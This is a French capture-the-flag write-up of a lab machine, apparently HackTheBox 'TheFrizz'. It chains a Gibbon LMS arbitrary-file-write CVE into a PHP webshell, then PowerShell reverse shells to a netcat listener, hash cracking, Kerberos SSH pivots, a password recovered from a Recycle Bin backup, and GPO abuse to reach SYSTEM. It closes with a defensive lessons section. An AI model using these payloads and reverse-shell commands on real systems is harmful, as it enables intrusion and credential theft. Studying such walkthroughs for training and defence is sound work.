![Cover](cover.png)

### Reconnaissance & Scanning

Ma phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d'attaque. La machine présente un grand nombre de ports ouverts, typiques d'un environnement **Active Directory**.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 10.10.11.60

# Scan détaillé des services identifiés
nmap -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -sCV 10.10.11.60
```

L'énumération révèle les points critiques suivants :
*   **Port 80 (HTTP)** : Serveur **Apache 2.4.58** (Win64) hébergeant une application PHP. Il redirige vers `frizzdc.frizz.htb`.
*   **Ports AD (53, 88, 389, 445)** : Confirment que la cible est un **Domain Controller** pour le domaine `frizz.htb`.
*   **Port 22 (SSH)** : Présence inhabituelle d'**OpenSSH for Windows**, ce qui offre un vecteur de connexion stable si des identifiants sont compromis.
*   **SMB** : Le scan indique que **NTLM** est désactivé (`NTLM:False`), ce qui signifie que toute authentification devra passer par **Kerberos**.

Je mets à jour mon fichier `/etc/hosts` pour résoudre le nom de domaine :
```bash
echo "10.10.11.60 frizzdc.frizz.htb frizz.htb frizzdc" | sudo tee -a /etc/hosts
```

---

### Énumération Web

Le site principal appartient à la "Walkerville Elementary School". En explorant les liens, je découvre un bouton "Staff Login" pointant vers `/Gibbon-LMS/`.

**Gibbon LMS** est une plateforme de gestion éducative open-source. Le footer indique la version **v25.0.00**. Une recherche de vulnérabilités pour cette version spécifique met en évidence une faille critique.

> **Schéma Mental : Vecteur d'entrée**
> 1. Identification d'un service tiers (**Gibbon LMS**).
> 2. Extraction de la version précise (**v25.0.00**).
> 3. Recherche de CVE connues : **CVE-2023-45878** (Unauthenticated Arbitrary File Write).
> 4. Objectif : Transformer l'écriture de fichier arbitraire en **Remote Code Execution (RCE)**.

---

### Analyse de la vulnérabilité : CVE-2023-45878

La vulnérabilité réside dans le module **Rubrics**, spécifiquement dans le fichier `rubrics_visualise_saveAjax.php`. Ce script ne vérifie pas l'authentification de l'utilisateur et accepte des paramètres **POST** pour sauvegarder des images.

**Mécanisme technique :**
*   Le paramètre `img` attend une chaîne formatée : `[mime type];[name],[base64 data]`.
*   Le script décode le **Base64** sans vérifier le contenu (pas de validation magique de fichier image).
*   Le paramètre `path` définit le nom du fichier de sortie.
*   Le script utilise `fopen()` et `fwrite()` pour écrire le contenu décodé sur le disque.

---

### Exploitation : Du File Write au Shell

Je commence par vérifier l'accessibilité du point de terminaison :
```bash
curl -I http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php
```

#### 1. Test d'écriture (PoC)
Je génère une chaîne simple en **Base64** pour tester l'écriture :
```bash
echo '0xdf was here!' | base64 # MHhkZiB3YXMgaGVyZSEK
```

Envoi de la requête **POST** :
```bash
curl http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'
```

#### 2. Upload du Webshell
Le test étant concluant, je prépare un **Webshell PHP** minimaliste :
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64 # PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyAgPz4K
```

Upload du shell :
```bash
curl http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;shell,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyAgPz4K&path=cmd.php&gibbonPersonID=0000000001'
```

Je vérifie l'exécution de commandes :
```bash
curl "http://frizzdc.frizz.htb/Gibbon-LMS/cmd.php?cmd=whoami"
# Réponse : frizz\w.webservice
```

#### 3. Reverse Shell
Pour obtenir un accès interactif, j'utilise un payload **PowerShell** encodé en **Base64** (via revshells.com) pour contourner les problèmes de caractères spéciaux dans l'URL.

```bash
# Sur ma machine d'attaque
nc -lvnp 443

# Exécution du payload via le webshell
curl "http://frizzdc.frizz.htb/Gibbon-LMS/cmd.php?cmd=powershell%20-e%20<BASE64_PAYLOAD>"
```

Je reçois une connexion en tant que **w.webservice**. Ce compte de service a des privilèges restreints, mais il me permet d'énumérer le système de fichiers et la base de données locale pour préparer la suite de l'intrusion.

---

### Post-Exploitation Initiale : Énumération du Webserver

Une fois mon accès établi en tant que **w.webservice**, je commence par inspecter l'environnement local. Le serveur tourne sous **XAMPP**, ce qui oriente immédiatement mes recherches vers les fichiers de configuration de l'application **Gibbon LMS**.

Dans `C:\xampp\htdocs\Gibbon-LMS\config.php`, je récupère les identifiants de la base de données :
*   **User** : `MrGibbonsDB`
*   **Password** : `MisterGibbs!Parrot!?1`

J'utilise le binaire local `mysql.exe` pour extraire les secrets des utilisateurs de la plateforme :

```powershell
# Énumération des tables pour localiser les utilisateurs
\xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "show tables;"

# Extraction du hash et du salt pour l'utilisateur f.frizzle
\xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "select username,passwordStrong,passwordStrongSalt from gibbonperson;"
```

---

### Mouvement Latéral : f.frizzle

L'extraction me donne le couple suivant pour **f.frizzle** :
*   **Hash** : `067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03`
*   **Salt** : `/aACFhikmNopqrRTVz2489`

> **Schéma Mental : Analyse de la routine de Hashing**
> L'analyse du code source PHP de Gibbon révèle que le mot de passe est généré via `$salt . $password`. Pour **Hashcat**, cela correspond au mode **1420** (**sha256($salt.$pass)**).

Je procède au cassage du hash :

```bash
# Formatage du hash pour Hashcat (hash:salt)
echo "067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489" > f.frizzle.hash

# Attaque par dictionnaire
hashcat -m 1420 f.frizzle.hash /usr/share/wordlists/rockyou.txt
```
Le mot de passe identifié est : `Jenni_Luvs_Magic23`.

Le **Domain Controller** ayant le **NTLM** désactivé, je dois utiliser **Kerberos** pour m'authentifier via **SSH**. Je synchronise d'abord mon horloge pour éviter l'erreur `KRB_AP_ERR_SKEW`.

```bash
# Synchronisation temporelle et authentification Kerberos
sudo ntpdate frizzdc.frizz.htb
kinit f.frizzle@FRIZZ.HTB

# Connexion SSH avec délégation GSSAPI
ssh -k f.frizzle@frizzdc.frizz.htb
```

---

### Énumération Interne & Mouvement vers m.schoolbus

En explorant le système avec les privilèges de **f.frizzle**, je remarque la présence d'un répertoire **Recycle Bin** à la racine `C:\`. Bien que les répertoires des autres utilisateurs soient protégés, je peux inspecter les fichiers supprimés.

```powershell
# Liste des fichiers cachés dans la corbeille
ls -force 'C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103'
```

Je trouve une archive **7-Zip** nommée `$RE2XMEG.7z`. Les fichiers commençant par `$R` contiennent les données réelles, tandis que les fichiers `$I` contiennent les métadonnées.

> **Schéma Mental : Forensic de la Corbeille Windows**
> La corbeille stocke les fichiers supprimés en les renommant. Le fichier `$I` contient le chemin original et la date de suppression. Ici, l'archive provient de `C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z`. C'est une sauvegarde de **WAPT** (Windows Advanced Package Tool).

Je rapatrie l'archive sur ma machine d'attaque pour analyse :

```bash
scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' backup.7z
7z x backup.7z
```

Dans les fichiers extraits, je fouille les configurations de **WAPT** et trouve le fichier `wapt/conf/waptserver.ini`. Il contient un mot de passe encodé en **Base64** :

```ini
[options]
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
```

Le décodage révèle le mot de passe : `!suBcig@MehTed!R`. Je teste ces identifiants contre les autres utilisateurs du domaine via **NetExec** et confirme l'accès pour **m.schoolbus**.

```bash
# Vérification des credentials
netexec smb frizzdc.frizz.htb -u m.schoolbus -p '!suBcig@MehTed!R' -k

# Pivot vers m.schoolbus
kinit m.schoolbus@FRIZZ.HTB
ssh -k m.schoolbus@frizzdc.frizz.htb
```

L'énumération des groupes de **m.schoolbus** montre qu'il appartient au groupe **Desktop Administrator**, ce qui sera le vecteur pour l'escalade finale vers **SYSTEM**.

---

### Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

Une fois positionné en tant que **m.schoolbus**, mon objectif est d'identifier un vecteur permettant d'atteindre le privilège **SYSTEM** sur le **Domain Controller**. L'énumération des groupes de l'utilisateur révèle une appartenance cruciale : le groupe **Desktop Administrator**.

#### Énumération des permissions GPO

Dans un environnement **Active Directory**, un utilisateur disposant de droits d'écriture sur un **Group Policy Object (GPO)** peut orchestrer une exécution de code sur toutes les machines (ou utilisateurs) auxquelles ce GPO est appliqué.

J'utilise **PowerView** (ou `Get-DomainGPOUserRights`) pour vérifier mes privilèges sur les objets du domaine :

```powershell
# Vérification des droits sur les GPOs
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.SecurityIdentifier -match "S-1-5-21-2386970044-1145388522-2932701813-1103" }
```

L'analyse confirme que **m.schoolbus** possède les droits **WriteProperty**, **WriteDacl** et **WriteOwner** sur un GPO spécifique lié à l'Unité Organisationnelle (OU) des serveurs ou des postes de travail.

> **Schéma Mental : GPO Abuse**
> 1. **Identification** : Repérer un GPO modifiable par l'utilisateur actuel.
> 2. **Injection** : Ajouter une directive malveillante (ex: **Scheduled Task**, **Startup Script**).
> 3. **Propagation** : Le **Domain Controller** synchronise le GPO vers **SYSVOL**.
> 4. **Exécution** : Le client (ici le DC lui-même ou un serveur cible) applique la stratégie via ses **Client Side Extensions (CSE)** et exécute la tâche en tant que **SYSTEM**.

#### Exploitation avec SharpGPOAbuse

Pour automatiser l'injection, j'utilise **SharpGPOAbuse.exe**. Je vais créer une **Immediate Task** qui s'exécutera immédiatement après la mise à jour des stratégies.

```bash
# Commande pour ajouter une tâche planifiée immédiate via le GPO compromis
./SharpGPOAbuse.exe --gponame "Default Desktop Policy" --taskname "DebugTask" --author "FRIZZ\m.schoolbus" --command "powershell.exe" --args "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA5ACIALAA0ADQANAA0ACkAOw..." --force
```

Une fois la tâche injectée dans le GPO, je force la mise à jour sur la machine cible (ou j'attends le cycle de rafraîchissement de 90 minutes) :

```powershell
# Forcer la mise à jour des GPOs sur le contrôleur de domaine
gpupdate /force
```

#### Capture du Flag Root

Le listener `nc` reçoit la connexion entrante, me donnant un shell avec les privilèges les plus élevés sur le **Domain Controller**.

```bash
oxdf@hacky$ nc -lvnp 4444
Connection received on 10.10.11.60
whoami
nt authority\system

type C:\Users\Administrator\Desktop\root.txt
f3e1b2...************************
```

---

### Analyse Post-Exploitation "Beyond Root"

La compromission totale de **TheFrizz** met en lumière plusieurs failles structurelles majeures :

1.  **Gestion des données résiduelles (Recycle Bin)** : Le vecteur de pivot vers **m.schoolbus** reposait sur la présence d'une archive de sauvegarde **WAPT** dans la corbeille. Les administrateurs oublient souvent que `$RECYCLE.BIN` est un répertoire persistant sur le disque qui peut contenir des secrets (fichiers de config, bases de données SQLite, clés privées) même après une "suppression" logique.
2.  **Sécurité des plateformes tierces** : L'utilisation de **Gibbon LMS** en version vulnérable (**CVE-2023-45878**) a permis un **Unauthenticated Arbitrary File Write**. Dans un environnement Windows, un serveur web ne devrait jamais avoir les droits d'écriture dans son propre répertoire racine sans une segmentation stricte.
3.  **Délégation de privilèges GPO** : Le groupe **Desktop Administrator** possédait des droits de modification sur des GPOs critiques. Dans un modèle de moindre privilège (**Tiered Administration Model**), aucun utilisateur non-administrateur de domaine ne devrait pouvoir modifier des GPOs s'appliquant à des serveurs de niveau Tier 0 (Domain Controllers).
4.  **Désactivation de NTLM** : La machine avait **NTLM** désactivé, forçant l'utilisation de **Kerberos**. Bien que cela soit une bonne pratique de durcissement, cela n'a pas empêché l'attaque car les identifiants crackés ont été utilisés pour forger des tickets (TGT/TGS) légitimes via `kinit`.
5.  **Persistence WAPT** : L'analyse du répertoire `C:\wapt` montre que l'outil de déploiement logiciel stockait des mots de passe en **Base64** dans ses fichiers `.ini`. Un attaquant peut facilement transformer cette plateforme de gestion en un outil de distribution de malwares à l'échelle du parc informatique.